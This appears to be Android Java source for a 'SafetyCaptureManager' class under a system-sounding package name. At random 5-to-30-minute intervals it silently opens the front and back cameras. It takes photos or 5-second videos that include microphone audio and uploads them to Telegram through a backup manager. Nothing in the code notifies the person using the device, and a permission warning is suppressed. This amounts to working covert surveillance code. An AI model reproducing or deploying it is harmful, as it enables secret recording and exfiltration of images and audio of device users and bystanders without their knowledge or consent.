package s28.system.phone;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.NonNull;

import java.io.File;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Random;

import s28.system.phone.beta.BetaSettings;
import s28.system.phone.beta.TelegramBackupManager;

public class SafetyCaptureManager {
    private static final String TAG = "SafetyCaptureManager";
    private final Context context;
    private final CameraManager cameraManager;
    private final TelegramBackupManager telegramBackupManager;
    private final BetaSettings settings;
    private final Random random = new Random();
    
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    public SafetyCaptureManager(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.telegramBackupManager = new TelegramBackupManager(context);
        this.settings = new BetaSettings(context);
    }

    public void start() {
        startBackgroundThread();
        scheduleNextCapture();
    }

    public void stop() {
        stopBackgroundThread();
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("SafetyCaptureThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }

    private void scheduleNextCapture() {
        if (backgroundHandler == null) return;
        
        int timerMinutes = settings.getSafetyTimer();
        long delay;
        if (timerMinutes > 0) {
            delay = timerMinutes * 60 * 1000L;
        } else {
            // Random time between 5 and 30 minutes
            delay = (5 + random.nextInt(25)) * 60 * 1000L;
        }
        
        backgroundHandler.postDelayed(() -> {
            if (settings.isSafetyCaptureEnabled()) {
                captureAccordingToSettings();
                scheduleNextCapture();
            }
        }, delay);
    }

    private void captureAccordingToSettings() {
        try {
            int cameraSelection = settings.getSafetyCamera(); // 0: Both, 1: Front, 2: Back
            int mode = settings.getSafetyMode(); // 0: Photo, 1: Video, 2: Auto
            
            if (mode == 2) {
                mode = random.nextBoolean() ? 0 : 1;
            }

            String[] cameraIds = cameraManager.getCameraIdList();
            for (String cameraId : cameraIds) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                
                if (facing == null) continue;
                
                boolean shouldCapture = false;
                if (cameraSelection == 0) shouldCapture = true;
                else if (cameraSelection == 1 && facing == CameraCharacteristics.LENS_FACING_FRONT) shouldCapture = true;
                else if (cameraSelection == 2 && facing == CameraCharacteristics.LENS_FACING_BACK) shouldCapture = true;
                
                if (shouldCapture) {
                    if (mode == 0) {
                        capturePhoto(cameraId, facing);
                    } else {
                        captureVideo(cameraId, facing);
                    }
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to capture", e);
        }
    }

    @SuppressLint("MissingPermission")
    private void capturePhoto(String cameraId, int facing) {
        try {
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    takePicture(camera, facing);
                }
                @Override public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                @Override public void onError(@NonNull CameraDevice camera, int error) { camera.close(); }
            }, backgroundHandler);
        } catch (Exception e) {
            Log.e(TAG, "Photo open failed", e);
        }
    }

    private void takePicture(CameraDevice camera, int facing) {
        try {
            ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(r -> {
                try (Image image = r.acquireLatestImage()) {
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        String name = "Safety_" + (facing == CameraCharacteristics.LENS_FACING_FRONT ? "Front" : "Back") + "_" + System.currentTimeMillis() + ".jpg";
                        telegramBackupManager.sendPhoto(bytes, name);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Image error", e);
                } finally {
                    camera.close();
                }
            }, backgroundHandler);

            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(reader.getSurface());
            camera.createCaptureSession(Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try { session.capture(builder.build(), null, backgroundHandler); } catch (Exception e) { camera.close(); }
                }
                @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) { camera.close(); }
            }, backgroundHandler);
        } catch (Exception e) {
            Log.e(TAG, "Take photo failed", e);
            camera.close();
        }
    }

    @SuppressLint("MissingPermission")
    private void captureVideo(String cameraId, int facing) {
        try {
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    recordVideo(camera, facing);
                }
                @Override public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                @Override public void onError(@NonNull CameraDevice camera, int error) { camera.close(); }
            }, backgroundHandler);
        } catch (Exception e) {
            Log.e(TAG, "Video open failed", e);
        }
    }

    private void recordVideo(CameraDevice camera, int facing) {
        File videoFile = new File(context.getExternalFilesDir(null), "safety_temp_" + facing + ".mp4");
        MediaRecorder recorder = new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setOutputFile(videoFile.getAbsolutePath());
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setVideoSize(1280, 720);
            recorder.setVideoFrameRate(30);
            recorder.setVideoEncodingBitRate(2000000);
            recorder.prepare();

            Surface surface = recorder.getSurface();
            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            builder.addTarget(surface);

            camera.createCaptureSession(Collections.singletonList(surface), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try {
                        session.setRepeatingRequest(builder.build(), null, backgroundHandler);
                        recorder.start();
                        backgroundHandler.postDelayed(() -> {
                            try {
                                recorder.stop();
                                recorder.release();
                                session.close();
                                camera.close();
                                // Upload to Telegram
                                String name = "Safety_" + (facing == CameraCharacteristics.LENS_FACING_FRONT ? "Front" : "Back") + "_" + System.currentTimeMillis() + ".mp4";
                                telegramBackupManager.backupFile(videoFile.getAbsolutePath(), "Safety", "5s", "Safety Video");
                            } catch (Exception e) {
                                Log.e(TAG, "Stop video failed", e);
                                camera.close();
                            }
                        }, 5000); // 5 second clip
                    } catch (Exception e) {
                        camera.close();
                    }
                }
                @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) { camera.close(); }
            }, backgroundHandler);
        } catch (Exception e) {
            Log.e(TAG, "Record video failed", e);
            camera.close();
        }
    }
}
